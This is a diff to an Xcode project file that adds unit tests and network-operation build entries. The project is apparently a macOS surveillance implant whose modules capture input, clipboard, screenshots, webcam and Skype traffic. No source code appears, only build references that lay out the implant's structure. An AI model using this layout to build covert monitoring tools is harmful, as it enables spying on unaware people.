@@ -7,6 +7,25 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		1A10796012E721320063759B /* AuthNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A40F7C812DF071C00BEACB8 /* AuthNetworkOperation.m */; };
+		1A10796212E721320063759B /* IDNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65115712DDC99100D4F1AF /* IDNetworkOperation.m */; };
+		1A10796412E721320063759B /* ConfNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65115A12DDC9B500D4F1AF /* ConfNetworkOperation.m */; };
+		1A10796612E721320063759B /* DownloadNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65115D12DDC9E200D4F1AF /* DownloadNetworkOperation.m */; };
+		1A10796812E721320063759B /* UploadNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116012DDCA1900D4F1AF /* UploadNetworkOperation.m */; };
+		1A10796A12E721320063759B /* FSNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116312DDCA4600D4F1AF /* FSNetworkOperation.m */; };
+		1A10796C12E721320063759B /* LogNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116612DDCA5700D4F1AF /* LogNetworkOperation.m */; };
+		1A10796E12E721320063759B /* ByeNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116912DDCA6C00D4F1AF /* ByeNetworkOperation.m */; };
+		1A10796F12E721560063759B /* Transport.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A5B320C12E4A2AF00677A0B /* Transport.m */; };
+		1A10797012E721560063759B /* RESTTransport.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A40F81712DF293A00BEACB8 /* RESTTransport.m */; };
+		1A10797112E721560063759B /* RESTNetworkProtocol.m in Sources */ = {isa = PBXBuildFile; fileRef = 1ADC5D9512DDBF2100650A1E /* RESTNetworkProtocol.m */; };
+		1A10797312E721850063759B /* GHUnit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A10797212E721850063759B /* GHUnit.framework */; };
+		1A10797812E721A70063759B /* RCSMCommon.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4436580F8CD55400CD910E /* RCSMCommon.m */; };
+		1A10798912E722590063759B /* GHUnitTestMain.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A10798812E722590063759B /* GHUnitTestMain.m */; };
+		1A10798E12E722AB0063759B /* RESTNetworkProtocolTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A10798D12E722AB0063759B /* RESTNetworkProtocolTest.m */; };
+		1A107A6312E723FE0063759B /* Cocoa.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1058C7A1FEA54F0111CA2CBB /* Cocoa.framework */; };
+		1A107A6412E724080063759B /* IOKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A43C9650FFA641A008E5EFE /* IOKit.framework */; };
+		1A107BD212E730800063759B /* AuthNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A107BD112E730800063759B /* AuthNetworkOperationTest.m */; };
+		1A107BF612E737060063759B /* RESTTransportTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A107BF512E737060063759B /* RESTTransportTest.m */; };
 		1A12A0BE1095A99F0090C4D7 /* CoreAudio.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A12A0BD1095A99F0090C4D7 /* CoreAudio.framework */; };
 		1A12A0F21095BD350090C4D7 /* QTKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A12A0F11095BD350090C4D7 /* QTKit.framework */; };
 		1A17CC611281B440001A74BD /* mach_override.mm in Sources */ = {isa = PBXBuildFile; fileRef = 1A12A14F1095F24C0090C4D7 /* mach_override.mm */; };
@@ -16,6 +35,8 @@
 		1A1B9CD60FA091970036558C /* spref.icns in Resources */ = {isa = PBXBuildFile; fileRef = 1A1B9CD50FA091970036558C /* spref.icns */; };
 		1A281C990FF3CAC800616589 /* RCSMAgentClipboard.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A281C970FF3CAC800616589 /* RCSMAgentClipboard.m */; };
 		1A281D320FF501A400616589 /* RCSMCommunicationManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A33F3FD0FC696FE00590FA1 /* RCSMCommunicationManager.m */; };
+		1A28786D12F062A80008973A /* UploadNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A28786C12F062A80008973A /* UploadNetworkOperationTest.m */; };
+		1A28798612F080B20008973A /* FSNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A28798512F080B20008973A /* FSNetworkOperationTest.m */; };
 		1A319E4B0FA895AD0079B060 /* RCSMInputManager.bundle in CopyFiles */ = {isa = PBXBuildFile; fileRef = 1AF610090FA72D87003F2C12 /* RCSMInputManager.bundle */; };
 		1A319EE50FA9B6410079B060 /* RCSMInputManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A319EE40FA9B6410079B060 /* RCSMInputManager.m */; };
 		1A319F090FA9C8260079B060 /* Info in Resources */ = {isa = PBXBuildFile; fileRef = 1A319F080FA9C8260079B060 /* Info */; };
@@ -26,26 +47,19 @@
 		1A33F4F30FC6AA9400590FA1 /* RCSMAgentScreenshot.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A1B9D3A0FA0AD670036558C /* RCSMAgentScreenshot.m */; };
 		1A33F8EC0FCC1EB000590FA1 /* RCSMEvents.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A33F8EB0FCC1EB000590FA1 /* RCSMEvents.m */; };
 		1A3A07A51005F588003EE323 /* IOKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A43C9650FFA641A008E5EFE /* IOKit.framework */; };
-		1A40F7C912DF071C00BEACB8 /* AuthNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A40F7C812DF071C00BEACB8 /* AuthNetworkOperation.m */; };
-		1A40F81812DF293A00BEACB8 /* RESTTransport.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A40F81712DF293A00BEACB8 /* RESTTransport.m */; };
 		1A43C9660FFA641A008E5EFE /* IOKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A43C9650FFA641A008E5EFE /* IOKit.framework */; };
 		1A4435230F8CA23E00CD910E /* NSMutableData+AES128.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4435220F8CA23E00CD910E /* NSMutableData+AES128.m */; };
 		1A4435490F8CB10800CD910E /* NSString+SHA1.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4435480F8CB10800CD910E /* NSString+SHA1.m */; };
 		1A4436590F8CD55400CD910E /* RCSMCommon.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4436580F8CD55400CD910E /* RCSMCommon.m */; };
 		1A508A9D11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A508A9C11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.m */; };
 		1A508B0511A6B1F20067BF81 /* Carbon.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A508B0411A6B1F20067BF81 /* Carbon.framework */; };
-		1A5B320D12E4A2AF00677A0B /* Transport.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A5B320C12E4A2AF00677A0B /* Transport.m */; };
-		1A65115812DDC99100D4F1AF /* IDNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65115712DDC99100D4F1AF /* IDNetworkOperation.m */; };
-		1A65115B12DDC9B500D4F1AF /* ConfNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65115A12DDC9B500D4F1AF /* ConfNetworkOperation.m */; };
-		1A65115E12DDC9E200D4F1AF /* DownloadNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65115D12DDC9E200D4F1AF /* DownloadNetworkOperation.m */; };
-		1A65116112DDCA1900D4F1AF /* UploadNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116012DDCA1900D4F1AF /* UploadNetworkOperation.m */; };
-		1A65116412DDCA4600D4F1AF /* FSNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116312DDCA4600D4F1AF /* FSNetworkOperation.m */; };
-		1A65116712DDCA5700D4F1AF /* LogNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116612DDCA5700D4F1AF /* LogNetworkOperation.m */; };
-		1A65116A12DDCA6C00D4F1AF /* ByeNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116912DDCA6C00D4F1AF /* ByeNetworkOperation.m */; };
 		1A68E0BA0FB8838400B17F60 /* RCSMAgentIMSkype.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A68E04F0FB881DD00B17F60 /* RCSMAgentIMSkype.m */; };
 		1A68E1530FB9A3B800B17F60 /* RCSMAgentInputLogger.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A68E1520FB9A3B800B17F60 /* RCSMAgentInputLogger.m */; };
 		1A68E3700FBB1F3200B17F60 /* RCSMAgentURL.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A68E36F0FBB1F3200B17F60 /* RCSMAgentURL.m */; };
 		1A7A94160FE13EC7007FF947 /* RCSMActions.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A7A94150FE13EC7007FF947 /* RCSMActions.m */; };
+		1A7FD31912F17EED00361B0B /* LogNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A7FD31812F17EED00361B0B /* LogNetworkOperationTest.m */; };
+		1A7FD34012F1841200361B0B /* NSData+SHA1.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A7FD33F12F1841200361B0B /* NSData+SHA1.m */; };
+		1A7FD34112F1841200361B0B /* NSData+SHA1.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A7FD33F12F1841200361B0B /* NSData+SHA1.m */; };
 		1A8D88490FC2B07C0067A45D /* RCSMEncryption.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4434D60F8C907000CD910E /* RCSMEncryption.m */; };
 		1A8D8E210FC43E420067A45D /* RCSMConfManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4434840F8B950B00CD910E /* RCSMConfManager.m */; };
 		1A9BB24E0FE8EF2600846023 /* RCSMLogManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A1B9D6B0FA0B4BB0036558C /* RCSMLogManager.m */; };
@@ -59,8 +73,40 @@
 		1AD1D6C81099EBAF005B548F /* QuartzCore.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AD1D6C71099EBAF005B548F /* QuartzCore.framework */; };
 		1AD4328812A3E3CF00B472C3 /* AddressBook.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AD4328712A3E3CF00B472C3 /* AddressBook.framework */; };
 		1AD53606101067D800AC54D8 /* Security.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AF92CC50F947FEE009ED774 /* Security.framework */; };
-		1ADC5D9612DDBF2100650A1E /* RESTNetworkProtocol.m in Sources */ = {isa = PBXBuildFile; fileRef = 1ADC5D9512DDBF2100650A1E /* RESTNetworkProtocol.m */; };
+		1AD6C55312E7443D00DEE42D /* NSMutableData+AES128.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4435220F8CA23E00CD910E /* NSMutableData+AES128.m */; };
+		1AD6C55412E7443D00DEE42D /* NSString+SHA1.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4435480F8CB10800CD910E /* NSString+SHA1.m */; };
 		1AF15F1811DC8E0100637F4E /* AppKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AF15F1711DC8E0100637F4E /* AppKit.framework */; };
+		1AF6069F12EDAEA90091F6F6 /* ByeNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF6069E12EDAEA90091F6F6 /* ByeNetworkOperationTest.m */; };
+		1AF6072912EDCAC30091F6F6 /* NSMutableData+SHA1.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF6072812EDCAC30091F6F6 /* NSMutableData+SHA1.m */; };
+		1AF6074A12EDD5A70091F6F6 /* IDNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF6074912EDD5A70091F6F6 /* IDNetworkOperationTest.m */; };
+		1AF6077B12EDE2160091F6F6 /* NSString+Pascal.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF6077A12EDE2160091F6F6 /* NSString+Pascal.m */; };
+		1AF607A112EED0A40091F6F6 /* NSString+PascalTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF607A012EED0A40091F6F6 /* NSString+PascalTest.m */; };
+		1AF608B612EF0E310091F6F6 /* ConfNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF608B512EF0E310091F6F6 /* ConfNetworkOperationTest.m */; };
+		1AF6091212EF1E5D0091F6F6 /* RCSMTaskManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF92B710F8F4A90009ED774 /* RCSMTaskManager.m */; };
+		1AF6091712EF1E990091F6F6 /* RCSMConfManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4434840F8B950B00CD910E /* RCSMConfManager.m */; };
+		1AF6091812EF1E990091F6F6 /* RCSMLogManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A1B9D6B0FA0B4BB0036558C /* RCSMLogManager.m */; };
+		1AF6091912EF1E990091F6F6 /* RCSMEvents.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A33F8EB0FCC1EB000590FA1 /* RCSMEvents.m */; };
+		1AF6091A12EF1E990091F6F6 /* RCSMActions.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A7A94150FE13EC7007FF947 /* RCSMActions.m */; };
+		1AF6091D12EF1ECB0091F6F6 /* RCSMSharedMemory.m in Sources */ = {isa = PBXBuildFile; fileRef = 1ABE7CDE0F7BA0A800BC61B1 /* RCSMSharedMemory.m */; };
+		1AF6091E12EF1ECB0091F6F6 /* RCSMAgentWebcam.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A1A2FCF10611067001F1B5D /* RCSMAgentWebcam.m */; };
+		1AF6091F12EF1ECB0091F6F6 /* RCSMAgentScreenshot.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A1B9D3A0FA0AD670036558C /* RCSMAgentScreenshot.m */; };
+		1AF6092012EF1ECB0091F6F6 /* RCSMCommunicationManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A33F3FD0FC696FE00590FA1 /* RCSMCommunicationManager.m */; };
+		1AF6092112EF1ECB0091F6F6 /* RCSMEncryption.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4434D60F8C907000CD910E /* RCSMEncryption.m */; };
+		1AF60BA512EF1EED0091F6F6 /* libz.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AA84484113C26D1005FBADB /* libz.a */; };
+		1AF60BA612EF1EED0091F6F6 /* libspeex.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AA84480113C22FE005FBADB /* libspeex.a */; };
+		1AF60BA712EF1EED0091F6F6 /* QuartzCore.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AD1D6C71099EBAF005B548F /* QuartzCore.framework */; };
+		1AF60BA812EF1EED0091F6F6 /* QTKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A12A0F11095BD350090C4D7 /* QTKit.framework */; };
+		1AF60BA912EF1EED0091F6F6 /* CoreAudio.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A12A0BD1095A99F0090C4D7 /* CoreAudio.framework */; };
+		1AF60BAA12EF1EED0091F6F6 /* QuickTime.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A1A2FDE106112CF001F1B5D /* QuickTime.framework */; };
+		1AF60BAB12EF1EED0091F6F6 /* Foundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 29B97325FDCFA39411CA2CEA /* Foundation.framework */; };
+		1AF60BAC12EF1EED0091F6F6 /* Carbon.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A508B0411A6B1F20067BF81 /* Carbon.framework */; };
+		1AF60BAD12EF1EED0091F6F6 /* ScriptingBridge.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 521DA5FD125C884000A3D49E /* ScriptingBridge.framework */; };
+		1AF60BAE12EF1EED0091F6F6 /* AddressBook.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AD4328712A3E3CF00B472C3 /* AddressBook.framework */; };
+		1AF60BE412EF27B50091F6F6 /* DownloadNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF60BE312EF27B50091F6F6 /* DownloadNetworkOperationTest.m */; };
+		1AF60C0412EF2B880091F6F6 /* NSData+Pascal.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF60C0312EF2B880091F6F6 /* NSData+Pascal.m */; };
+		1AF60C0512EF2B880091F6F6 /* NSData+Pascal.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF60C0312EF2B880091F6F6 /* NSData+Pascal.m */; };
+		1AF60C0E12EF2CC10091F6F6 /* NSData+PascalTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF60C0D12EF2CC10091F6F6 /* NSData+PascalTest.m */; };
+		1AF60C4212F028A00091F6F6 /* OCMock.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AF60C4112F028A00091F6F6 /* OCMock.framework */; };
 		1AF610290FA75A2B003F2C12 /* Cocoa.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1058C7A1FEA54F0111CA2CBB /* Cocoa.framework */; };
 		1AF92CB10F947D53009ED774 /* spref.tiff in Resources */ = {isa = PBXBuildFile; fileRef = 1AF92CB00F947D53009ED774 /* spref.tiff */; };
 		521DA5FE125C884000A3D49E /* ScriptingBridge.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 521DA5FD125C884000A3D49E /* ScriptingBridge.framework */; };
@@ -86,6 +132,14 @@
 /* Begin PBXFileReference section */
 		089C165DFE840E0CC02AAC07 /* English */ = {isa = PBXFileReference; fileEncoding = 10; lastKnownFileType = text.plist.strings; name = English; path = English.lproj/InfoPlist.strings; sourceTree = "<group>"; };
 		1058C7A1FEA54F0111CA2CBB /* Cocoa.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Cocoa.framework; path = /System/Library/Frameworks/Cocoa.framework; sourceTree = "<absolute>"; };
+		1A10793212E718920063759B /* RESTNetworkProtocolTest-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "RESTNetworkProtocolTest-Info.plist"; sourceTree = "<group>"; };
+		1A10795612E720ED0063759B /* Tests.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Tests.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		1A10795A12E720ED0063759B /* Tests-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "Tests-Info.plist"; sourceTree = "<group>"; };
+		1A10797212E721850063759B /* GHUnit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = GHUnit.framework; path = Library/Frameworks/GHUnit.framework; sourceTree = SDKROOT; };
+		1A10798812E722590063759B /* GHUnitTestMain.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = GHUnitTestMain.m; path = Tests/GHUnitTestMain.m; sourceTree = "<group>"; };
+		1A10798D12E722AB0063759B /* RESTNetworkProtocolTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RESTNetworkProtocolTest.m; path = Tests/RESTNetworkProtocolTest.m; sourceTree = "<group>"; };
+		1A107BD112E730800063759B /* AuthNetworkOperationTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = AuthNetworkOperationTest.m; path = Tests/AuthNetworkOperationTest.m; sourceTree = "<group>"; };
+		1A107BF512E737060063759B /* RESTTransportTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RESTTransportTest.m; path = Tests/RESTTransportTest.m; sourceTree = "<group>"; };
 		1A12A0171091FE8C0090C4D7 /* RCSMAgentVoipSkype.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentVoipSkype.h; path = Agents/RCSMAgentVoipSkype.h; sourceTree = "<group>"; };
 		1A12A0181091FE8C0090C4D7 /* RCSMAgentVoipSkype.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentVoipSkype.m; path = Agents/RCSMAgentVoipSkype.m; sourceTree = "<group>"; };
 		1A12A0BD1095A99F0090C4D7 /* CoreAudio.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = CoreAudio.framework; path = System/Library/Frameworks/CoreAudio.framework; sourceTree = SDKROOT; };
@@ -102,6 +156,8 @@
 		1A1B9D6B0FA0B4BB0036558C /* RCSMLogManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMLogManager.m; path = Modules/RCSMLogManager.m; sourceTree = "<group>"; };
 		1A281C970FF3CAC800616589 /* RCSMAgentClipboard.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentClipboard.m; path = Agents/RCSMAgentClipboard.m; sourceTree = "<group>"; };
 		1A281C980FF3CAC800616589 /* RCSMAgentClipboard.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentClipboard.h; path = Agents/RCSMAgentClipboard.h; sourceTree = "<group>"; };
+		1A28786C12F062A80008973A /* UploadNetworkOperationTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = UploadNetworkOperationTest.m; path = Tests/UploadNetworkOperationTest.m; sourceTree = "<group>"; };
+		1A28798512F080B20008973A /* FSNetworkOperationTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = FSNetworkOperationTest.m; path = Tests/FSNetworkOperationTest.m; sourceTree = "<group>"; };
 		1A319EE30FA9B6410079B060 /* RCSMInputManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMInputManager.h; path = InputManager/RCSMInputManager.h; sourceTree = "<group>"; };
 		1A319EE40FA9B6410079B060 /* RCSMInputManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMInputManager.m; path = InputManager/RCSMInputManager.m; sourceTree = "<group>"; };
 		1A319F080FA9C8260079B060 /* Info */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = Info; sourceTree = "<group>"; };
@@ -164,6 +220,9 @@
 		1A68E36F0FBB1F3200B17F60 /* RCSMAgentURL.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentURL.m; path = Agents/RCSMAgentURL.m; sourceTree = "<group>"; };
 		1A7A94140FE13EC7007FF947 /* RCSMActions.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMActions.h; path = Modules/RCSMActions.h; sourceTree = "<group>"; };
 		1A7A94150FE13EC7007FF947 /* RCSMActions.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMActions.m; path = Modules/RCSMActions.m; sourceTree = "<group>"; };
+		1A7FD31812F17EED00361B0B /* LogNetworkOperationTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = LogNetworkOperationTest.m; path = Tests/LogNetworkOperationTest.m; sourceTree = "<group>"; };
+		1A7FD33E12F1841200361B0B /* NSData+SHA1.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = "NSData+SHA1.h"; path = "Categories/NSData+SHA1.h"; sourceTree = "<group>"; };
+		1A7FD33F12F1841200361B0B /* NSData+SHA1.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSData+SHA1.m"; path = "Categories/NSData+SHA1.m"; sourceTree = "<group>"; };
 		1A84C8EC100F18B30069A8E5 /* TODO */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = TODO; sourceTree = "<group>"; };
 		1AA84480113C22FE005FBADB /* libspeex.a */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; name = libspeex.a; path = Support/Speex/libspeex.a; sourceTree = "<group>"; };
 		1AA84484113C26D1005FBADB /* libz.a */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; path = libz.a; sourceTree = "<group>"; };
@@ -182,6 +241,19 @@
 		1ADC5D9412DDBF2100650A1E /* RESTNetworkProtocol.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RESTNetworkProtocol.h; path = Modules/RESTNetworkProtocol.h; sourceTree = "<group>"; };
 		1ADC5D9512DDBF2100650A1E /* RESTNetworkProtocol.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RESTNetworkProtocol.m; path = Modules/RESTNetworkProtocol.m; sourceTree = "<group>"; };
 		1AF15F1711DC8E0100637F4E /* AppKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AppKit.framework; path = System/Library/Frameworks/AppKit.framework; sourceTree = SDKROOT; };
+		1AF6069E12EDAEA90091F6F6 /* ByeNetworkOperationTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = ByeNetworkOperationTest.m; path = Tests/ByeNetworkOperationTest.m; sourceTree = "<group>"; };
+		1AF6072712EDCAC30091F6F6 /* NSMutableData+SHA1.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = "NSMutableData+SHA1.h"; path = "Categories/NSMutableData+SHA1.h"; sourceTree = "<group>"; };
+		1AF6072812EDCAC30091F6F6 /* NSMutableData+SHA1.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSMutableData+SHA1.m"; path = "Categories/NSMutableData+SHA1.m"; sourceTree = "<group>"; };
+		1AF6074912EDD5A70091F6F6 /* IDNetworkOperationTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = IDNetworkOperationTest.m; path = Tests/IDNetworkOperationTest.m; sourceTree = "<group>"; };
+		1AF6077912EDE2160091F6F6 /* NSString+Pascal.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = "NSString+Pascal.h"; path = "Categories/NSString+Pascal.h"; sourceTree = "<group>"; };
+		1AF6077A12EDE2160091F6F6 /* NSString+Pascal.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSString+Pascal.m"; path = "Categories/NSString+Pascal.m"; sourceTree = "<group>"; };
+		1AF607A012EED0A40091F6F6 /* NSString+PascalTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSString+PascalTest.m"; path = "Tests/NSString+PascalTest.m"; sourceTree = "<group>"; };
+		1AF608B512EF0E310091F6F6 /* ConfNetworkOperationTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = ConfNetworkOperationTest.m; path = Tests/ConfNetworkOperationTest.m; sourceTree = "<group>"; };
+		1AF60BE312EF27B50091F6F6 /* DownloadNetworkOperationTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = DownloadNetworkOperationTest.m; path = Tests/DownloadNetworkOperationTest.m; sourceTree = "<group>"; };
+		1AF60C0212EF2B880091F6F6 /* NSData+Pascal.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = "NSData+Pascal.h"; path = "Categories/NSData+Pascal.h"; sourceTree = "<group>"; };
+		1AF60C0312EF2B880091F6F6 /* NSData+Pascal.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSData+Pascal.m"; path = "Categories/NSData+Pascal.m"; sourceTree = "<group>"; };
+		1AF60C0D12EF2CC10091F6F6 /* NSData+PascalTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSData+PascalTest.m"; path = "Tests/NSData+PascalTest.m"; sourceTree = "<group>"; };
+		1AF60C4112F028A00091F6F6 /* OCMock.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = OCMock.framework; path = Library/Frameworks/OCMock.framework; sourceTree = SDKROOT; };
 		1AF610090FA72D87003F2C12 /* RCSMInputManager.bundle */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = RCSMInputManager.bundle; sourceTree = BUILT_PRODUCTS_DIR; };
 		1AF6100A0FA72D87003F2C12 /* RCSMInputManager-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "RCSMInputManager-Info.plist"; sourceTree = "<group>"; };
 		1AF92B700F8F4A90009ED774 /* RCSMTaskManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMTaskManager.h; path = Modules/RCSMTaskManager.h; sourceTree = "<group>"; };
@@ -201,6 +273,27 @@
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
